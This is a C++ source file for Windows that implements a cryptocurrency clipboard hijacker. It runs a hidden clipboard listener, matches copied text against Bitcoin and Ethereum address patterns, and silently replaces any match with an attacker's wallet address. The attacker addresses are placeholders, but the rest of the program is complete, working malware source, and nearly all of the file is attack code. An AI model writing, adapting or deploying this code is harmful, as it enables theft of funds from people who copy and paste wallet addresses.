#define _DEFUG
#include <stdio.h>
#include <iostream>
#include <Windows.h>
#include <string>
#include <regex>

void DEBUG_PRINT(CONST CHAR* str)
{
#ifdef _DEBUG
    printf("Debug : %s \n", str);
#endif
}


CONST CHAR* get_clip_data(HWND hd)
{

    DEBUG_PRINT("get_clip_data function running\n");

    if (!OpenClipboard(hd)) { // Access to clipboard

        DEBUG_PRINT("Error - Failed to open clipboard\n");
        return NULL;
    }

    if (!IsClipboardFormatAvailable(CF_TEXT)) // Checking for text format only
    {
        DEBUG_PRINT("Data in clipboard is not CF_TEXT");
        CloseClipboard();
        return NULL;
    }

    HANDLE MemBlock = GetClipboardData(CF_TEXT); // get data from the clipboard in text format
    if (MemBlock == NULL) {
        DEBUG_PRINT("Error - Get clipboard data failed \n");
        CloseClipboard();
        return NULL;
    }

    CHAR* Data = static_cast<char*>(GlobalLock(MemBlock));  // Casting Handle clipboard object to char* to access the data

    if (Data == NULL){
        DEBUG_PRINT("Error - Data is empty.... \n");
        CloseClipboard();
        return NULL;
    }
    //GlobalUnlock(MemBlock);
    CloseClipboard();
    return Data;
}



BOOL set_clip_data(CONST CHAR* data, HWND handle)
{

    DEBUG_PRINT("set clip data function funning.\n");

    if (!OpenClipboard(handle)) {
        DEBUG_PRINT("Error - opening clipboard failed.\n");
        return false;
    }

    if (!EmptyClipboard()) {
        DEBUG_PRINT("Error - empty clipboard function failed.\n");
        CloseClipboard();
        return false;
    }

    HGLOBAL MemBlock = GlobalAlloc(GMEM_MOVEABLE, (strlen(data) + 1));
    if (MemBlock == NULL) {
        DEBUG_PRINT("Error - GloableAlloc Failed\n");
        CloseClipboard();
        return false;
    }
    

    memcpy(GlobalLock(MemBlock), data, (strlen(data) + 1));
    GlobalUnlock(MemBlock);
       
    DEBUG_PRINT("set data to clipboard\n");
    if (SetClipboardData(CF_TEXT, MemBlock) == NULL) {
        CloseClipboard();
        return false;
    }

    CloseClipboard();
    return true;
}


bool crypto_check(CONST CHAR* addr_search, CONST CHAR* addr_pattern)
{
    std::regex pattern(addr_pattern);
    if (std::regex_match(addr_search, pattern)) {
        return true;
    }
    return false;
}



void crypto_swap(CONST CHAR* addr_search, HWND handle) {

    const int size = 2;
    CONST CHAR* ATTACKER_ADDR[size] =
    {
        "SWAPPED_WITH_ATTACKER_BTC_ADDRESS",
        "SWAPPED_WITH_ATTACKER_ETH_ADDRESS"
    };

    CONST CHAR* PATTERN_ADDR[size] =
    {

        "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
        "^0x[a-fA-F0-9]{40}"
    };
    
    for (size_t i = 0; i < size; i++)
    {
        if (crypto_check(addr_search, PATTERN_ADDR[i]))
        {
            set_clip_data(ATTACKER_ADDR[i], handle);
        }
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    LRESULT result = 0;
    switch (uMsg)
    {
        case WM_CREATE:
        {
            ShowWindow(GetConsoleWindow(), SW_SHOW);
            AddClipboardFormatListener(hwnd);
            break;
        }

        case WM_CLIPBOARDUPDATE:
        {
            const char* data = get_clip_data(hwnd);
            printf("[+] Data changed : %s\n", data);
            crypto_swap(data, hwnd);
            break;
        }

        case WM_DESTROY:
        {
            RemoveClipboardFormatListener(hwnd);
            break;
        }

        default:
        {
            result = DefWindowProc(hwnd, uMsg, wParam, lParam);
            break;
        }

    }
    return (result);
}

WNDCLASSEX windProperties(const wchar_t* name) {
    HWND wind = NULL;
    WNDCLASSEX wc = { 0 };
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = name;

    return wc;
}


void run_message_loop()
{
    const wchar_t* className = L"Test";
    HWND hWindow = NULL;

    WNDCLASSEX wx = windProperties(className);
    RegisterClassEx(&wx);

    hWindow = CreateWindowEx(
        0,
        className,
        L"ClipboardListener",
        0, 0, 0, 0, 0,
        HWND_MESSAGE,
        NULL, NULL, NULL);


    // Main msg loop
    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}
int main()
{
    run_message_loop();
    return 0;
}
